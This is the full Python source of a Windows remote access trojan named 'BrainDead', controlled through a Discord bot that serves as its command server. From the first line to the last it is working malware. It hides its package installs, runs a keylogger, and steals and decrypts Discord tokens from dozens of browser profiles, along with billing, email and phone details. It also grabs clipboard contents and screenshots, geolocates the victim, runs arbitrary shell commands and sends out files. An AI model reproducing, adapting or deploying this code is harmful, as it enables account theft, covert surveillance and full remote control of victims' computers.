import os
import re
import sys
import uuid
import json
import time
import ctypes
import base64
import random
import string
import socket
import shutil
import asyncio
import sqlite3
import platform
import threading
import subprocess
import ctypes.wintypes

agent_version = "2.1.0"
python_path = sys.executable

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
class Sys:
    def InstallPackages(packages):
        for package in packages:
            subprocess.run([python_path, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    def Remove(path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            pass

Sys.InstallPackages(packages=["requests", "pycryptodome", "nextcord", "pynput", "pillow"])

import nextcord as discord
import requests
from PIL import Image
from Crypto.Cipher import AES
from pynput.keyboard import Key, Listener

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
# ****** Discord ****** #
bot_login_token = "%token%"  # %token%
guild_id = 1335193091275096156

# ****** Paths ****** #
localappdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

installation_folder = f"C:\\Users\\{os.getlogin()}\\My Games"
if not os.path.exists(installation_folder):
    os.mkdir(installation_folder)

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
keyloggerStatut = False
keyloggerPressedKeys = []

cmdDirectory = ""

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================ UTILITY =============================================================================================================== #
def GetSessionName():
    return f"{os.getlogin().lower()}┃{'-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}"

def GetRandomString(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters, k=length))

def GetTime():
    return time.strftime("%H:%M:%S", time.localtime())

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return
    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

def GenerateTree(path: str, prefix: str = "", current_depth: int = 0, max_depth: int = 1) -> str:
    tree_str = ""
    
    if not os.path.isdir(path):
        return f"[Erreur] {path} n'est pas un dossier valide.\n"
    
    try:
        entries = sorted(os.listdir(path), key=lambda e: (os.path.isfile(os.path.join(path, e)), e.lower()))
    except PermissionError:
        return f"[Erreur] Accès refusé à {path}.\n"
    
    for index, entry in enumerate(entries):
        entry_path = os.path.join(path, entry)
        is_last = (index == len(entries) - 1)
        connector = "└── " if is_last else "├── "

        if os.path.isdir(entry_path):
            emoji = "📁 "
        elif entry.lower().endswith(".txt"):
            emoji = "📄 "
        elif entry.lower().endswith(".pdf"):
            emoji = "📕 "
        elif entry.lower().endswith(".png"):
            emoji = "🖼 "
        elif entry.lower().endswith(".jpg"):
            emoji = "🖼 "
        elif entry.lower().endswith(".zip"):
            emoji = "📦 "
        else:
            emoji = ""

        tree_str += f"{prefix}{connector}{emoji}{entry}\n"

        if os.path.isdir(entry_path) and (current_depth < max_depth):
            new_prefix = prefix + ("    " if is_last else "│   ")
            tree_str += GenerateTree(entry_path, new_prefix, current_depth + 1, max_depth)

    return tree_str


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
def GetClipboard():
    return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip()

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
def GetIdleTime():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000
    return 0

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

def Screenshot():
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    hdc_screen = user32.GetDC(0)
    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
    gdi32.SelectObject(hdc_mem, hbm)
    gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
    bmp_info = BITMAPINFOHEADER()
    bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmp_info.biWidth = screen_width
    bmp_info.biHeight = -screen_height
    bmp_info.biPlanes = 1
    bmp_info.biBitCount = 32
    bmp_info.biCompression = 0
    buffer_size = screen_width * screen_height * 4
    buffer = ctypes.create_string_buffer(buffer_size)
    gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
    gdi32.DeleteObject(hbm)
    gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)
    image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
    image.save(f"{installation_folder}\\{os.getlogin()} - Screenshot.png")

# ____________________________________________________________________________________________________________________________________________________ #
# ========================================================== DISCORD FUNCS =========================================================================== #
class Discord:
    def __init__(self):
        self.discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
        self.discordCommonPaths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

    @staticmethod
    def ValidateToken(token: str) -> bool:
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if r.status_code == 200: return True
        return False

    @staticmethod
    def DecryptVal(buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    @staticmethod
    def GetMasterKey(path: str) -> str:
        if not os.path.exists(path):
            return None
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return None

        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

        pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
            decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
            ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            return decrypted_key
    
    def GetDiscordTokens(self):
        discord_tokens = []
        discord_uids = []
        for name, path in self.discordCommonPaths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(roaming + f'\{_discord}\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.discordRegexpEnc, line):
                            token = Discord.DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), Discord.GetMasterKey(roaming + f'\{_discord}\Local State'))

                            if Discord.ValidateToken(token):
                                uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                if uid not in discord_uids:
                                    discord_tokens.append(token)
                                    discord_uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.discordRegexp, line):
                            if Discord.ValidateToken(token):
                                uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                if uid not in discord_uids:
                                    discord_tokens.append(token)
                                    discord_uids.append(uid)

        return discord_tokens

    @staticmethod
    def ExtractInfosFromToken(tokens):
        final_to_return = []
        for token in tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']

            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else:
                payment_methods = None

            final_message = (f"│👤 Username: {username} ({user_id})\n"
                             f"│🔑 Token: {token}\n"
                             f"│⚡ Nitro: {nitro}\n"
                             f"│💳 Billing: {payment_methods if payment_methods != "" else "None"}\n"
                             f"│🔗 MFA: {mfa}\n"
                             f"│🌐 Email: {email if email != None else "None"}\n"
                             f"│📞 Phone: {phone if phone != None else "None"}\n")
            final_to_return.append(final_message)

        return final_to_return


# ______________________________________________________________________________________________________________________________________________________ #
# ================================================================= KEYLOGGER FUNCS ==================================================================== #
def OnPress(key):
    global keyloggerPressedKeys, keyloggerStatut

    if not keyloggerStatut:
        return

    keyCodes = {
        Key.space: " ",
        Key.shift: "",
        Key.tab: " [TAB] ",
        Key.backspace: " [DEL] ",
        Key.esc: " [ESC] ",
        Key.caps_lock: " [CAPS LOCK] ",
        Key.enter: " [ENTER] ",
        Key.shift_r: ""
    }
    
    try:
        if key.char:
            keyloggerPressedKeys.append(key.char)
        else:
            keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))
    except AttributeError:
        keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))

def KeyloggerThread():
    with Listener(on_press=OnPress) as listen:
        listen.join()


C2_guild = None

class Client(discord.Client):
    # _____________________________________________________________________________________________________________________________________________________ #
    # ============================================================== CHANNELS SETUP ======================================================================= #
    @staticmethod
    async def on_ready():
        global C2_guild

        for guild in client.guilds:
            if guild.id == guild_id:
                C2_guild = guild

                # ****** Commands channel ****** #
                current_session = discord.utils.get(C2_guild.text_channels, name=GetSessionName())

                if current_session is None:
                    current_session = await C2_guild.create_text_channel(GetSessionName())
                    await current_session.purge()

                    embed = discord.Embed(title=f":wireless:  BrainDead", description=f"**BrainDead v{agent_version} Pro**", color=discord.Color.blue())
                    embed.add_field(name="", value=f"```{GetTime()} - BrainDead agent initialised\n{GetTime()} - Keylogger initialised\n```", inline=False)
                    await current_session.send(embed=embed)
                else:
                    await current_session.purge()

                    embed = discord.Embed(title=f":wireless:  BrainDead", description=f"BrainDead v{agent_version} Pro", color=discord.Color.blue())
                    embed.add_field(name="", value=f"```{GetTime()} - BrainDead agent initialised\n{GetTime()} - Keylogger initialised\n```", inline=False)
                    await current_session.send(embed=embed)

                # ****** Global channel ****** #
                global_session = discord.utils.get(C2_guild.text_channels, name="🌍┃global-commands")
                if global_session is None:
                    global_session = await C2_guild.create_text_channel("🌍┃global-commands")


        th_keylogger = threading.Thread(target=KeyloggerThread)
        th_keylogger.start()


    async def on_message(self, message):
        global keyloggerStatut, keyloggerPressedKeys, cmdDirectory, C2_guild

        if message.author == self.user:
            return
        
        channel = message.channel
        if channel.name == GetSessionName():
            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .ping ================================================================== #
            if message.content == ".ping":
                await message.delete()
                
                embed = discord.Embed(description=f":wireless: Session status : `alive`", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .help ================================================================== #
            elif message.content == ".help":
                await message.delete()

                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab discord` : Grab user's Discord informations\n- `.system` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.sh <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # ====================================================================== .clear =============================================================== #
            elif message.content == ".cl" or message.content == ".clear":
                await message.channel.purge()

            # ____________________________________________________________________________________________________________________________________________ #
            # ================================================================== .kill =================================================================== #
            elif message.content.startswith(".kill"):
                await message.delete()

                command = message.content.replace(".kill ", "", 1)

                try:
                    KillProcess(command)
                    embed = discord.Embed(description=f":small_red_triangle_down: Process `{command}` terminated", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                except:
                    embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _________________________________________________________________________________________________________________________________________________ #
            # ================================================================== .clipboard =================================================================== #
            elif message.content == ".cb" or message.content == ".clipboard":
                await message.delete()

                clipboard = GetClipboard()
                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w") as f:
                    f.write(clipboard)
                
                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Clipboard.txt")
                await message.channel.send(file=file_embed)

                Sys.Remove(file_path)

            # ____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab discord ================================================================== #
            elif message.content == ".grab discord":
                await message.delete()
                
                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                DiscordStealer = Discord()
                tokens = DiscordStealer.ExtractInfosFromToken(DiscordStealer.GetDiscordTokens())

                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w") as f:
                    for token in tokens:
                        f.write(token)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Discord Tokens.txt")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()
                Sys.Remove(file_path)


            # _______________________________________________________________________________________________________________________________________________ #
            # =================================================================== .system ================================================================== #
            elif message.content == ".system" or message.content == ".sys":
                await message.delete()

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                requInfos = requests.get('https://ipinfo.io')
                data = requInfos.json()

                session = os.getlogin()
                computer_name = socket.gethostname()
                os_version = platform.system() + " " + platform.release()
                architecture = platform.machine()
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
                ip = data.get('ip')
                country = data.get('country')
                region = data.get('region')
                city = data.get('city')
                loc = data.get('loc')
                org = data.get('org')
                cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip().split('\n')[2]
                ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()

                embed = discord.Embed(description="", color=discord.Color.blue())
                embed.add_field(name=":computer: **Global Info**", value=f"```ansi\nComputer@Username : {computer_name}@{session}\nOperative System : {os_version}\nArchitecture : {architecture}\nIdle Time : {GetIdleTime()}s```", inline=True)
                embed.add_field(name=":floppy_disk: **Hardware**", value=f"```ansi\nRAM : {ram}\nCPU : {cpu}```", inline=True)
                embed.add_field(name=":satellite: **Network Info**", value=f"```ansi\nPublic IP : {ip}\nMAC : {mac}\nCountry : {country}\nRegion : {region}\nCity : {city}\nLocalisation : {loc}\nInternet Provider : {org}```", inline=False)
                await message.channel.send(embed=embed)

                await loading_embed.delete()

            # __________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .screenshot ================================================================== #
            elif message.content == ".ss" or message.content == ".screenshot":
                await message.delete()

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                Screenshot()

                embed = discord.Embed(
                    title="",
                    description=f"**{GetTime()} - `[Manual]`**",
                    color=discord.Color.blue()
                )

                screenshot_path = f"{installation_folder}\\{os.getlogin()} - Screenshot.png"
                screenshot_filename = "screenshot.png"

                screenshot_file = discord.File(screenshot_path, filename=screenshot_filename)

                embed.set_image(url=f"attachment://{screenshot_filename}")

                await channel.send(embed=embed, file=screenshot_file)

                Sys.Remove(screenshot_path)
                await loading_embed.delete()

            # _________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .keylogger ================================================================== #
            elif message.content == ".start keylogger":
                await message.delete()

                if keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already activated : use `.stop keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return
                
                keyloggerStatut = True
                embed = discord.Embed(description=f":keyboard: Keylogger has started", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            elif message.content == ".stop keylogger":
                await message.delete()

                if not keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already **OFF** : use `.start keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                embed = discord.Embed(description=f":keyboard: Keylogger is stopped !", color=discord.Color.red())
                await message.channel.send(embed=embed)
                keyloggerStatut = False

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)
                
                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                finalMessage = ""
                for key in keyloggerPressedKeys:
                    finalMessage += key
                with open(file_path, "w") as f:
                    f.write(finalMessage)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Keylogger Logs.txt")
                await message.channel.send(file=file_embed)

                await embed_sent.delete()

                Sys.Remove(file_path)

            # __________________________________________________________________________________________________________________________________________ #
            # =================================================================== .cd ================================================================== #
            elif message.content.startswith(".cd"):
                await message.delete()

                command = message.content.replace(".cd ", "", 1)

                try:
                    os.chdir(command)
                    cmdDirectory = os.getcwd()
                except:
                    embed = discord.Embed(description=f":no_entry: Unkown directory : `{command}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .sh ================================================================== #
            elif message.content.startswith(".sh"):
                await message.delete()

                command = message.content.replace(".sh ", "", 1)

                try:
                    finalCommand = ["cmd", "/c", command]
                    result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")

                    embed = discord.Embed(description=f"Command executed successfully", color=discord.Color.blue())

                    if result.stdout and result.stdout.strip():
                        file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(result.stdout.strip())
                        
                        file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Commande Output.txt")
                        await message.channel.send(file=file_embed)
                        
                    await message.channel.send(embed=embed)
                    Sys.Remove(file_path)
                except Exception as e:
                    embed = discord.Embed(description=f":no_entry: Unexpected error : `{e}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    Sys.Remove(file_path)

            # ________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .download ================================================================== #
            elif message.content.startswith(".download"):
                await message.delete()

                command = message.content.replace(".download ", "", 1)
                
                if not os.path.exists(command):
                    embed = discord.Embed(description=":no_entry: Invalid file path", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                file_path = command
                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - {os.path.basename(file_path)}")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()

            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .idle ================================================================== #
            elif message.content == ".idle":
                await message.delete()

                embed = discord.Embed(description=f":stopwatch: Last input recorded `{GetIdleTime()}` seconds ago", color=discord.Color.blue())
                await message.channel.send(embed=embed)
            
            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .dir =================================================================== #
            elif message.content == ".dir":
                await message.delete()

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                tree = GenerateTree(cmdDirectory, max_depth=1)

                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(tree)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Tree.txt")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()


            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== unkown command ================================================================== #
            elif message.content.startswith("."):
                await message.delete()

                embed = discord.Embed(description=f":no_entry: Unkown command `{message.content}`", color=discord.Color.red())
                await message.channel.send(embed=embed)

        elif channel.name == "🌍┃global-commands":
            if message.content == ".ping":
                my_session = discord.utils.get(C2_guild.channels, name=GetSessionName())

                embed = discord.Embed(description=f":wireless: Session status : `alive`\n<#{my_session.id}>", color=discord.Color.blue())
                await message.channel.send(embed=embed)
                


intents = discord.Intents.default()
intents.message_content = True
client = Client(intents=intents)
client.run(bot_login_token)